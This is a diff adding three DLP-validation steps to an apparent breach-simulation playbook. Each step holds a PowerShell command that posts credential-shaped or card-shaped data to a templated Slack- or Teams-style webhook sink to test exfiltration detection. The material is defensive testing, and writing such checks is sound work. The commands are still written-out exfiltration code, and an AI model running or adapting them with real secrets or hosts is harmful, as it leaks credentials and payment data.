@@ -121,3 +121,117 @@ steps:
       # See the Slack step above for why this step's graded verdict never
       # comes from this script's own success/failure.
     cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — AWS Cloud Credentials over Slack webhook shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Slack-Compatible Exfiltration of AWS Cloud Credentials (T1567.004)"
+    technique_id: T1567.004
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic AWS-credential-shaped payload to the platform's own Slack-webhook-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: Slack-webhook-shaped HTTPS POST content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[default]`naws_access_key_id=AKIAIOSFODNN7EXAMPLE`naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+      $token = "{{SINK_TOKEN}}"
+      $body = @{ text = "$token`n$payload" } | ConvertTo-Json -Compress
+      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
+        Write-Output "EXEC T1567.004: AWS-credential-shaped Slack webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: slack_webhook_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.004: Slack-compatible webhook traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
+      }
+      # See the Slack step above for why this step's graded verdict never
+      # comes from this script's own success/failure.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — PostgreSQL Connection String over Slack webhook shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Slack-Compatible Exfiltration of PostgreSQL Connection String (T1567.004)"
+    technique_id: T1567.004
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic PostgreSQL-connection-string-shaped payload to the platform's own Slack-webhook-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: Slack-webhook-shaped HTTPS POST content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "postgresql://bas_sim_user:BAS-SIM-DLP-Placeholder4@bas-sim-postgres:5432/bas_sim_dlp"
+      $token = "{{SINK_TOKEN}}"
+      $body = @{ text = "$token`n$payload" } | ConvertTo-Json -Compress
+      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: slack_webhook_result=success"
+        Write-Output "EXEC T1567.004: PostgreSQL-connection-string-shaped Slack webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: slack_webhook_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.004: Slack-compatible webhook traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-SLACK]"
+      }
+      # See the Slack step above for why this step's graded verdict never
+      # comes from this script's own success/failure.
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Content-type diversity — Maestro Card Record over Teams webhook shape
+  # ---------------------------------------------------------------------------
+  - name: "DLP Validation — Microsoft Teams-Compatible Exfiltration of Maestro Card Record (T1567.004)"
+    technique_id: T1567.004
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic Maestro-card-shaped payload to the platform's own Teams-webhook-shaped endpoint (this same on-prem orchestrator). Traffic-shape simulation only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on its main API port"
+    detection:
+      - "DLP/CASB: Microsoft-Teams-webhook-shaped HTTPS POST content inspection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nMaestro,6759649826438453"
+      $token = "{{SINK_TOKEN}}"
+      $body = @{ text = "$token`n$payload" } | ConvertTo-Json -Compress
+      $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/teams/webhookb2/00000000-0000-0000-0000-000000000000/IncomingWebhook/11111111111111111111111111111111/22222222-2222-2222-2222-222222222222"
+      try {
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "DLP_OBSERVATION: teams_webhook_result=success"
+        Write-Output "EXEC T1567.004: Maestro-card-shaped Teams webhook traffic simulation completed (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-TEAMS]"
+      } catch {
+        Write-Output "DLP_OBSERVATION: teams_webhook_exception=$($_.Exception.Message)"
+        Write-Output "EXEC T1567.004: Microsoft Teams-compatible webhook traffic simulation raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-WEBHOOK-TEAMS]"
+      }
+      # See the Slack step above for why this step's graded verdict never
+      # comes from this script's own success/failure.
+    cleanup: ""
